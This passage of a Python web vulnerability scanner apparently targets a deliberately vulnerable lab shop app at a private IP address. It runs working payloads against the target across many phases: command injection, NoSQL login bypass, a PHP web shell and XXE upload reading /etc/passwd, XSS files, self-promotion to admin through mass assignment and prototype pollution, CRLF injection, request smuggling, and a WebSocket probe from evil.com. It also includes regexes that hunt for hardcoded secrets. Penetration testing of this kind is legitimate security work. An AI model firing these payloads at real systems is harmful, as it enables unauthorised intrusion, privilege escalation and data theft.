    auth = {"Authorization": f"Bearer {cfg.auth_token}"} if cfg.auth_token else {}

    for payload, technique in b2b_payloads:
        r = req(cfg, "POST", f"{cfg.base_url}/b2b/v2/orders",
                data=payload, headers={**auth, "Content-Type": "application/json"})
        if r and ("uid=" in r.text or "root:" in r.text):
            add_finding(cfg, "command_injection", "critical",
                       f"{cfg.base_url}/b2b/v2/orders",
                       f"Command injection ({technique}) via b2b orders",
                       cwe="CWE-78", evidence=r.text[:300], method="POST")
            results["findings"].append({"endpoint": "/b2b/v2/orders", "technique": technique})

    # Video endpoint
    cmd_payloads = [
        ("; id", "uid="), ("| id", "uid="), ("$(id)", "uid="),
    ]
    for payload, indicator in cmd_payloads:
        r = req(cfg, "GET", f"{cfg.base_url}/video", params={"file": payload})
        if r and indicator in r.text:
            add_finding(cfg, "command_injection", "critical",
                       f"{cfg.base_url}/video",
                       f"Command injection via video file param",
                       cwe="CWE-78", evidence=r.text[:300], param="file")

    save_results(cfg, "13_command_injection", results)
    return results


# ============================================================================
# PHASE 14: SENSITIVE DATA EXPOSURE
# ============================================================================

def test_sensitive_data(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 14: SENSITIVE DATA EXPOSURE")
    log(cfg, "=" * 60)

    results = {"findings": []}

    sensitive_paths = [
        ("/ftp", "Directory listing", "medium"),
        ("/ftp/", "FTP directory", "medium"),
        ("/api-docs", "API documentation", "medium"),
        ("/api-docs/", "Swagger UI", "medium"),
        ("/metrics", "Application metrics", "medium"),
        ("/.well-known/security.txt", "Security policy", "info"),
        ("/snippets", "Code snippets", "medium"),
        ("/support/logs", "Support logs", "high"),
        ("/encryptionkeys", "Encryption keys dir", "high"),
        ("/encryptionkeys/jwt.pub", "JWT public key", "high"),
        ("/encryptionkeys/premium.key", "Premium key", "high"),
        ("/api/Users", "User listing", "high"),
        ("/api/SecurityQuestions", "Security questions", "low"),
        ("/api/Challenges", "Challenge list", "info"),
        ("/.git/HEAD", "Git repository", "high"),
        ("/.env", "Environment file", "critical"),
        ("/rest/memories", "User photos", "medium"),
        ("/rest/chatbot/status", "Chatbot status", "info"),
    ]

    for path, desc, default_sev in sensitive_paths:
        r = req(cfg, "GET", cfg.base_url + path)
        if r and r.status_code == 200 and len(r.text) > 20:
            content = r.text.lower()
            sev = default_sev
            if any(s in content for s in ["password", "secret", "private_key", "api_key"]):
                sev = "high"
            add_finding(cfg, "sensitive_data_exposure", sev, cfg.base_url + path,
                       f"{desc} accessible ({len(r.text)} bytes)", cwe="CWE-200",
                       evidence=r.text[:300])
            results["findings"].append({"path": path, "desc": desc, "size": len(r.text), "severity": sev})

    # Check JS for hardcoded secrets
    for js_path in ["/main.js"]:
        r = req(cfg, "GET", cfg.base_url + js_path, timeout=30)
        if not r or r.status_code != 200:
            continue
        patterns = [
            (r'testingPassword\s*[=:]\s*["\']([^"\']+)["\']', "hardcoded_test_password"),
            (r'(?:password|passwd|pwd)\s*[=:]\s*["\']([^"\']{4,})["\']', "hardcoded_password"),
            (r'(?:api[_-]?key|apikey)\s*[=:]\s*["\']([^"\']{10,})["\']', "api_key"),
            (r'(?:client[_-]?id|clientId)\s*[=:]\s*["\']([^"\']{15,})["\']', "oauth_client_id"),
            (r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', "jwt_token"),
        ]
        for pattern, secret_type in patterns:
            for m in re.finditer(pattern, r.text, re.IGNORECASE):
                val = m.group(1) if m.lastindex else m.group(0)
                if len(val) > 3:
                    add_finding(cfg, f"hardcoded_{secret_type}", "high",
                               cfg.base_url + js_path,
                               f"Hardcoded {secret_type} in JS: {val[:40]}...",
                               cwe="CWE-798", evidence=m.group(0)[:100])

    save_results(cfg, "14_sensitive_data", results)
    return results


# ============================================================================
# PHASE 15: ACCESS CONTROL
# ============================================================================

def test_access_control(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 15: BROKEN ACCESS CONTROL")
    log(cfg, "=" * 60)

    results = {"findings": []}

    if not cfg.auth_token:
        log(cfg, "Skipping access control tests - no auth token", "WARN")
        save_results(cfg, "15_access_control", results)
        return results

    auth = {"Authorization": f"Bearer {cfg.auth_token}"}

    # Privilege escalation: change role
    try:
        r = req(cfg, "GET", f"{cfg.base_url}/rest/user/whoami", headers=auth)
        if r and r.status_code == 200:
            user_data = r.json().get("user", {})
            user_id = user_data.get("id")
            if user_id:
                r2 = req(cfg, "PUT", f"{cfg.base_url}/api/Users/{user_id}",
                         json={"role": "admin"}, headers=auth)
                if r2 and r2.status_code == 200:
                    try:
                        data = r2.json()
                        if data.get("data", {}).get("role") == "admin":
                            add_finding(cfg, "privilege_escalation", "critical",
                                       f"{cfg.base_url}/api/Users/{user_id}",
                                       "Can set own role to admin via PUT",
                                       cwe="CWE-269", evidence=json.dumps(data)[:200],
                                       method="PUT", param="role")
                    except Exception:
                        pass
    except Exception:
        pass

    # Admin pages with user token
    for path in ["/administration", "/accounting"]:
        r = req(cfg, "GET", cfg.base_url + path, headers=auth)
        if r and r.status_code == 200 and len(r.text) > 100:
            add_finding(cfg, "broken_access_control", "high", cfg.base_url + path,
                       f"Regular user can access admin page: {path}",
                       cwe="CWE-284", evidence=r.text[:200])

    save_results(cfg, "15_access_control", results)
    return results


# ============================================================================
# PHASE 16: CLICKJACKING
# ============================================================================

def test_clickjacking(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 16: CLICKJACKING")
    log(cfg, "=" * 60)

    results = {"findings": []}
    r = req(cfg, "GET", cfg.base_url)
    if r:
        xfo = r.headers.get("X-Frame-Options", "")
        csp = r.headers.get("Content-Security-Policy", "")
        frameable = xfo.upper() not in ("DENY", "SAMEORIGIN") and "frame-ancestors" not in csp
        if frameable:
            add_finding(cfg, "clickjacking", "medium", cfg.base_url,
                       "No X-Frame-Options DENY/SAMEORIGIN and no CSP frame-ancestors",
                       cwe="CWE-1021", evidence=f"XFO: {xfo or 'missing'}")
        results["xfo"] = xfo
        results["frameable"] = frameable

    save_results(cfg, "16_clickjacking", results)
    return results


# ============================================================================
# PHASE 17: MASS ASSIGNMENT
# ============================================================================

def test_mass_assignment(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 17: MASS ASSIGNMENT")
    log(cfg, "=" * 60)

    results = {"findings": []}

    payloads = [
        {"email": f"mass1_{int(time.time())}@t.com", "password": "T1!", "passwordRepeat": "T1!",
         "role": "admin", "securityQuestion": {"id": 1}, "securityAnswer": "t"},
        {"email": f"mass2_{int(time.time())}@t.com", "password": "T1!", "passwordRepeat": "T1!",
         "isAdmin": True, "securityQuestion": {"id": 1}, "securityAnswer": "t"},
        {"email": f"mass3_{int(time.time())}@t.com", "password": "T1!", "passwordRepeat": "T1!",
         "totpSecret": "", "deluxeToken": "abc", "securityQuestion": {"id": 1}, "securityAnswer": "t"},
    ]

    for payload in payloads:
        r = req(cfg, "POST", f"{cfg.base_url}/api/Users", json=payload)
        if r and r.status_code in (200, 201):
            try:
                data = r.json().get("data", r.json())
                if data.get("role") == "admin" or data.get("isAdmin") is True:
                    add_finding(cfg, "mass_assignment", "critical",
                               f"{cfg.base_url}/api/Users",
                               "Mass assignment: created user with admin privileges",
                               cwe="CWE-915", evidence=json.dumps(data)[:300], method="POST")
                extra = [k for k in ["role", "isAdmin", "totpSecret", "deluxeToken"]
                         if k in str(data)]
                if extra:
                    add_finding(cfg, "mass_assignment_accepted", "medium",
                               f"{cfg.base_url}/api/Users",
                               f"Server accepted extra fields: {', '.join(extra)}",
                               cwe="CWE-915", evidence=json.dumps(data)[:200], method="POST")
                results["findings"].append({"payload_keys": list(payload.keys()), "response": data})
            except Exception:
                pass

    save_results(cfg, "17_mass_assignment", results)
    return results


# ============================================================================
# PHASE 18: NOSQL INJECTION
# ============================================================================

def test_nosql_injection(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 18: NOSQL INJECTION")
    log(cfg, "=" * 60)

    results = {"findings": []}

    payloads = [
        {"email": {"$gt": ""}, "password": {"$gt": ""}},
        {"email": {"$ne": ""}, "password": {"$ne": ""}},
        {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    ]

    for payload in payloads:
        r = req(cfg, "POST", f"{cfg.base_url}/rest/user/login", json=payload)
        if r and r.status_code == 200 and "authentication" in r.text:
            add_finding(cfg, "nosql_injection", "critical",
                       f"{cfg.base_url}/rest/user/login",
                       f"NoSQL injection auth bypass: {json.dumps(payload, default=str)}",
                       cwe="CWE-943", evidence=r.text[:200], method="POST")
            results["findings"].append({"payload": str(payload), "success": True})
            break

    save_results(cfg, "18_nosql_injection", results)
    return results


# ============================================================================
# PHASE 19: FILE UPLOAD
# ============================================================================

def test_file_upload(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 19: FILE UPLOAD")
    log(cfg, "=" * 60)

    results = {"findings": []}
    if not cfg.auth_token:
        log(cfg, "Skipping - no auth", "WARN")
        save_results(cfg, "19_file_upload", results)
        return results

    auth = {"Authorization": f"Bearer {cfg.auth_token}"}

    uploads = [
        ("evil.php", "<?php system($_GET['cmd']); ?>", "application/x-php", "php_shell"),
        ("evil.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml", "svg_xss"),
        ("evil.xml", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "application/xml", "xml_xxe"),
        ("evil.html", "<script>alert('xss')</script>", "text/html", "html_xss"),
    ]

    for ep in ["/file-upload", "/profile/image/file"]:
        url = cfg.base_url + ep
        for fname, content, mime, test_type in uploads:
            r = req(cfg, "POST", url, files={"file": (fname, content, mime)}, headers=auth)
            if r and r.status_code in (200, 201):
                add_finding(cfg, "unrestricted_file_upload", "high", url,
                           f"Uploaded {test_type} ({fname}) accepted",
                           cwe="CWE-434", evidence=r.text[:200], method="POST")
                results["findings"].append({"endpoint": ep, "file": fname, "type": test_type})

    save_results(cfg, "19_file_upload", results)
    return results


# ============================================================================
# PHASE 20: HTTP SMUGGLING
# ============================================================================

def test_http_smuggling(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 20: HTTP SMUGGLING")
    log(cfg, "=" * 60)

    results = {"findings": []}

    try:
        smuggle = (
            f"POST / HTTP/1.1\r\nHost: {cfg.target_host}:{cfg.target_port}\r\n"
            f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
        )
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((cfg.target_host, cfg.target_port))
        sock.send(smuggle.encode())
        resp = sock.recv(4096).decode("utf-8", errors="ignore")
        sock.close()
        results["cl_te_probe"] = resp[:200]
    except Exception as e:
        results["cl_te_error"] = str(e)

    save_results(cfg, "20_http_smuggling", results)
    return results


# ============================================================================
# PHASE 21: WEBSOCKETS
# ============================================================================

def test_websockets(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 21: WEBSOCKET TESTING")
    log(cfg, "=" * 60)

    results = {"findings": []}
    try:
        key = base64.b64encode(os.urandom(16)).decode()
        ws_req = (
            f"GET /socket.io/?EIO=4&transport=websocket HTTP/1.1\r\n"
            f"Host: {cfg.target_host}:{cfg.target_port}\r\n"
            f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
            f"Origin: http://evil.com\r\n\r\n"
        )
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((cfg.target_host, cfg.target_port))
        sock.send(ws_req.encode())
        resp = sock.recv(4096).decode("utf-8", errors="ignore")
        sock.close()
        if "101" in resp:
            add_finding(cfg, "websocket_no_origin_check", "medium",
                       f"ws://{cfg.target_host}:{cfg.target_port}/socket.io/",
                       "WebSocket accepts arbitrary Origin (http://evil.com)",
                       cwe="CWE-346", evidence=resp[:200])
        results["response"] = resp[:200]
    except Exception as e:
        results["error"] = str(e)

    save_results(cfg, "21_websockets", results)
    return results


# ============================================================================
# PHASE 22: INFORMATION DISCLOSURE VIA ERRORS
# ============================================================================

def test_info_disclosure(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 22: ERROR-BASED INFO DISCLOSURE")
    log(cfg, "=" * 60)

    results = {"findings": [], "errors_collected": []}

    error_triggers = [
        ("/api/Users/undefined", "GET"), ("/api/Products/99999", "GET"),
        ("/rest/products/search?q=" + "A" * 5000, "GET"),
        ("/api/Users?limit=-1", "GET"), ("/api/..;/admin", "GET"),
    ]

    stack_indicators = [
        "stack", "trace", "at Function", "at Object", "node_modules",
        "TypeError", "RangeError", "sequelize", "express", "internal/",
    ]

    for path, method in error_triggers:
        r = req(cfg, method, cfg.base_url + path)
        if not r or r.status_code < 400:
            continue
        body = r.text
        if any(ind in body for ind in stack_indicators):
            add_finding(cfg, "information_disclosure", "medium", cfg.base_url + path,
                       f"Error response reveals stack trace / technical details",
                       cwe="CWE-209", evidence=body[:500])
            results["errors_collected"].append({"path": path, "status": r.status_code, "body": body[:500]})

    save_results(cfg, "22_info_disclosure", results)
    return results


# ============================================================================
# PHASE 23: CRLF INJECTION
# ============================================================================

def test_crlf(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 23: CRLF INJECTION")
    log(cfg, "=" * 60)

    results = {"findings": []}
    crlf_payloads = [
        ("%0d%0aSet-Cookie:crlf=injected", "header_injection"),
        ("%0d%0aX-Injected:true", "custom_header"),
    ]

    for payload, technique in crlf_payloads:
        r = req(cfg, "GET", f"{cfg.base_url}/?q={payload}", allow_redirects=False)
        if r and ("crlf" in str(r.headers).lower() or "x-injected" in str(r.headers).lower()):
            add_finding(cfg, "crlf_injection", "high", f"{cfg.base_url}/?q={payload}",
                       f"CRLF injection ({technique}): injected header in response",
                       cwe="CWE-93", evidence=str(dict(r.headers))[:300])

    save_results(cfg, "23_crlf", results)
    return results


# ============================================================================
# PHASE 24: PROTOTYPE POLLUTION
# ============================================================================

def test_prototype_pollution(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 24: PROTOTYPE POLLUTION")
    log(cfg, "=" * 60)

    results = {"findings": []}

    payloads = [
        {"__proto__": {"isAdmin": True}},
        {"constructor": {"prototype": {"isAdmin": True}}},
    ]

    for payload in payloads:
        r = req(cfg, "POST", f"{cfg.base_url}/api/Users",
                json={**payload, "email": f"proto_{int(time.time())}@t.com",
                      "password": "T1!", "passwordRepeat": "T1!",
                      "securityQuestion": {"id": 1}, "securityAnswer": "t"})
        if r and r.status_code in (200, 201):
            try:
                data = r.json()
                if data.get("data", {}).get("isAdmin") or data.get("isAdmin"):
                    add_finding(cfg, "prototype_pollution", "critical",
                               f"{cfg.base_url}/api/Users",
                               "Prototype pollution: __proto__.isAdmin accepted",
                               cwe="CWE-1321", evidence=json.dumps(data)[:300], method="POST")
            except Exception:
                pass
            results["findings"].append({"payload": str(payload), "status": r.status_code})

    save_results(cfg, "24_prototype_pollution", results)
    return results


# ============================================================================
# MAIN
# ============================================================================

def run_scan(cfg):
    start = datetime.now()
    log(cfg, "=" * 60)
    log(cfg, f"COMPREHENSIVE VULNERABILITY SCAN v2")
    log(cfg, f"Target: {cfg.base_url}")
    log(cfg, f"Started: {start.isoformat()}")
    log(cfg, f"Results: {cfg.results_dir}")
    log(cfg, "=" * 60)

    # Verify target
    r = req(cfg, "GET", cfg.base_url)
    if not r:
        log(cfg, "Target unreachable!", "ERR")
        return
    log(cfg, f"Target UP (HTTP {r.status_code})", "OK")

    phases = [
        ("Endpoint Discovery", discover_endpoints),
        ("Security Headers", check_security_headers),
        ("Authentication", test_authentication),
        ("SQL Injection", test_sql_injection),
        ("XSS", test_xss),
        ("Path Traversal", test_path_traversal),
        ("IDOR", test_idor),
        ("Open Redirect", test_open_redirect),
        ("SSRF", test_ssrf),
        ("CORS", test_cors),
        ("SSTI", test_ssti),
        ("XXE", test_xxe),
        ("Command Injection", test_command_injection),
        ("Sensitive Data", test_sensitive_data),
        ("Access Control", test_access_control),
        ("Clickjacking", test_clickjacking),
        ("Mass Assignment", test_mass_assignment),
        ("NoSQL Injection", test_nosql_injection),
        ("File Upload", test_file_upload),
        ("HTTP Smuggling", test_http_smuggling),
        ("WebSockets", test_websockets),
        ("Info Disclosure", test_info_disclosure),
        ("CRLF Injection", test_crlf),
        ("Prototype Pollution", test_prototype_pollution),
    ]

    for i, (name, func) in enumerate(phases, 1):
        # Check target is still alive between phases
        if i > 1 and i % 4 == 0:
            check = req(cfg, "GET", cfg.base_url)
            if not check:
                log(cfg, "Target seems down, waiting for recovery...", "WARN")
                if not wait_for_target(cfg):
                    log(cfg, "Target did not recover, stopping scan", "ERR")
                    break

        try:
            log(cfg, f"Phase {i}/{len(phases)}: {name}")
            func(cfg)
            log(cfg, f"Phase {i} done: {name}", "OK")
        except Exception as e:
            log(cfg, f"Phase {i} error ({name}): {e}", "ERR")
            import traceback
            traceback.print_exc()

    # Summary
    end = datetime.now()
    dur = (end - start).total_seconds()

    summary = {
        "target": cfg.base_url, "scan_start": start.isoformat(), "scan_end": end.isoformat(),
        "duration_seconds": dur, "total_findings": len(cfg.findings),
        "by_severity": {s: len([f for f in cfg.findings if f["severity"] == s])
                        for s in ["critical", "high", "medium", "low", "info"]},
        "by_type": {},
        "endpoints_discovered": len(cfg.endpoints_discovered),
        "findings": cfg.findings,
    }
    for f in cfg.findings:
        summary["by_type"][f["type"]] = summary["by_type"].get(f["type"], 0) + 1

    save_results(cfg, "FINAL_REPORT", summary)

    # Text report
    with open(cfg.results_dir / "FINAL_REPORT.txt", "w") as f:
        f.write("=" * 60 + "\n")
        f.write("COMPREHENSIVE VULNERABILITY SCAN REPORT\n")
        f.write("=" * 60 + "\n\n")
        f.write(f"Target: {cfg.base_url}\nDuration: {dur:.0f}s\n")
        f.write(f"Endpoints: {len(cfg.endpoints_discovered)}\n\n")
        f.write(f"FINDINGS: {len(cfg.findings)}\n")
        for s in ["critical", "high", "medium", "low", "info"]:
            f.write(f"  {s.capitalize():10s}: {summary['by_severity'][s]}\n")
        f.write("\n" + "-" * 60 + "\nDETAILS\n" + "-" * 60 + "\n\n")
        for i, fd in enumerate(cfg.findings, 1):
            f.write(f"[{fd['severity'].upper()}] #{i}: {fd['type']}\n")
            f.write(f"  URL: {fd['url']}\n  Detail: {fd['detail']}\n")
            if fd.get("cwe"):
                f.write(f"  CWE: {fd['cwe']}\n")
            if fd.get("evidence"):
                f.write(f"  Evidence: {fd['evidence'][:150]}\n")
            f.write("\n")

    log(cfg, "=" * 60)
    log(cfg, "SCAN COMPLETE")
    log(cfg, f"Duration: {dur:.0f}s | Findings: {len(cfg.findings)}")
    for s in ["critical", "high", "medium", "low", "info"]:
        c = summary["by_severity"][s]
        if c > 0:
            log(cfg, f"  {s.capitalize()}: {c}")
    log(cfg, f"Results: {cfg.results_dir}")
    log(cfg, "=" * 60)

    with open(cfg.results_dir / "SCAN_COMPLETE", "w") as f:
        f.write(f"Completed: {end.isoformat()}\nFindings: {len(cfg.findings)}\n")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Comprehensive Web Vulnerability Scanner v2")
    parser.add_argument("--host", default="192.168.204.160")
    parser.add_argument("--port", type=int, default=3000)
    parser.add_argument("--scheme", default="http")
    parser.add_argument("--output", default=None)
    args = parser.parse_args()

    cfg = ScanConfig(args.host, args.port, args.scheme)
    if args.output:
        cfg.results_dir = Path(args.output)
        cfg.results_dir.mkdir(parents=True, exist_ok=True)
        cfg.log_file = cfg.results_dir / "scan_log.txt"

    run_scan(cfg)
